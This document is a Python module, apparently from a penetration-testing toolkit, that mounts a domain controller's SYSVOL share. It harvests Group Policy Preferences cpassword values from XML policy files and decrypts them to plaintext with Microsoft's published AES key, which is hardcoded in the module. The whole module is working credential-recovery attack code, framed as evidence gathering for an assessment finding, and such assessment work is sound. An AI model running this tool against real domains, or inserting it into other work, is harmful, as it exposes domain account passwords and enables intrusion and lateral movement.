"""SYSVOL / Group Policy Preferences (GPP) cpassword crawl — read-only.

Group Policy Preferences could store credentials in SYSVOL XML files (Groups.xml,
Services.xml, ScheduledTasks.xml, Drives.xml, DataSources.xml, Printers.xml) encrypted
with an AES key Microsoft PUBLISHED (MS-GPPREF), so any authenticated user who can read
SYSVOL can recover them. MS14-025 stopped new ones being written but did not remove the
old files. This crawls SYSVOL over SMB with the supplied test account and decrypts any
cpassword it finds — evidence for a critical draft finding.

Windows-native path only (uses `net use` + UNC). On Linux/Kali the offensive-ext Attack
Mode covers the same ground with netexec (`--gpp-password`).
"""
from __future__ import annotations

import base64
import os
import re
import subprocess
from pathlib import Path
from xml.etree import ElementTree as ET

# The 32-byte AES key Microsoft published in MS-GPPREF; the IV is 16 zero bytes.
_GPP_KEY = bytes.fromhex("4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b")
_CPASS_RE = re.compile(r'cpassword\s*=\s*"([^"]*)"')
_GPP_FILES = ("groups.xml", "services.xml", "scheduledtasks.xml", "drives.xml",
              "datasources.xml", "printers.xml")


def decrypt_cpassword(cpassword: str) -> str:
    """Decrypt a GPP cpassword to plaintext, or '' if it cannot be decrypted."""
    if not cpassword:
        return ""
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    except Exception:
        return ""
    try:
        pad = "=" * ((4 - len(cpassword) % 4) % 4)
        data = base64.b64decode(cpassword + pad)
        decryptor = Cipher(algorithms.AES(_GPP_KEY), modes.CBC(b"\x00" * 16)).decryptor()
        raw = decryptor.update(data) + decryptor.finalize()
        if raw:
            n = raw[-1]
            if 1 <= n <= 16:               # strip PKCS7 padding
                raw = raw[:-n]
        return raw.decode("utf-16-le", errors="replace").strip("\x00").strip()
    except Exception:
        return ""


def _fields_from_xml(path: Path) -> list:
    """Return [{file_type, name, username, cpassword}] for every element carrying a cpassword."""
    out = []
    try:
        text = path.read_text(encoding="utf-8", errors="replace")
    except OSError:
        return out
    if "cpassword" not in text:
        return out
    ftype = path.name
    try:
        root = ET.fromstring(text)
        for elem in root.iter():
            cp = elem.get("cpassword")
            if cp is None:
                continue
            user = (elem.get("userName") or elem.get("accountName") or elem.get("runAs")
                    or elem.get("newName") or "")
            out.append({"file_type": ftype, "name": elem.get("name", ""),
                        "username": user, "cpassword": cp})
    except ET.ParseError:
        for cp in _CPASS_RE.findall(text):   # malformed XML — fall back to a raw scan
            out.append({"file_type": ftype, "name": "", "username": "", "cpassword": cp})
    return out


def crawl(dc: str, domain: str, username: str, password: str, pinned_ip: str | None = None) -> dict:
    """Mount \\<dc>\\SYSVOL with the test account, scan Policies for GPP cpassword, decrypt.
    Returns {status, ...}. Never raises. Windows-native only."""
    if os.name != "nt":
        return {"status": "skipped",
                "reason": "SYSVOL taraması Windows-native yolda çalışır; WSL/Kali'de Attack Mode (nxc --gpp-password) kullanın."}
    if not all((dc, domain, username, password)):
        return {"status": "skipped", "reason": "DC/domain/hesap yok"}
    host = pinned_ip or dc
    unc = rf"\\{host}\SYSVOL"
    user_arg = username if ("\\" in username or "@" in username) else f"{domain}\\{username}"
    mounted = False
    try:
        # `net use ... *` reads the password from stdin, so it never appears in argv/history.
        proc = subprocess.run(["net", "use", unc, "/user:" + user_arg, "*"],
                              input=password + "\r\n", capture_output=True, text=True,
                              timeout=40, check=False)
        if proc.returncode != 0:
            return {"status": "error", "reason": "SYSVOL bağlanamadı (net use): "
                    + (proc.stdout or proc.stderr or "").strip()[:200]}
        mounted = True
        policies = Path(rf"\\{host}\SYSVOL\{domain}\Policies")
        findings, files_scanned = [], 0
        if policies.is_dir():
            for path in policies.rglob("*.xml"):
                if path.name.lower() not in _GPP_FILES and path.stat().st_size > 1_000_000:
                    continue
                files_scanned += 1
                for hit in _fields_from_xml(path):
                    hit["plaintext"] = decrypt_cpassword(hit["cpassword"])
                    try:
                        hit["path"] = str(path.relative_to(policies.parent))
                    except ValueError:
                        hit["path"] = path.name
                    findings.append(hit)
        return {"status": "ok", "files_scanned": files_scanned,
                "cpassword_count": len(findings), "findings": findings[:100]}
    except (OSError, subprocess.TimeoutExpired) as exc:
        return {"status": "error", "reason": f"SYSVOL taraması başarısız: {exc}"}
    finally:
        if mounted:
            try:
                subprocess.run(["net", "use", unc, "/delete", "/y"],
                              capture_output=True, text=True, timeout=20, check=False)
            except Exception:
                pass
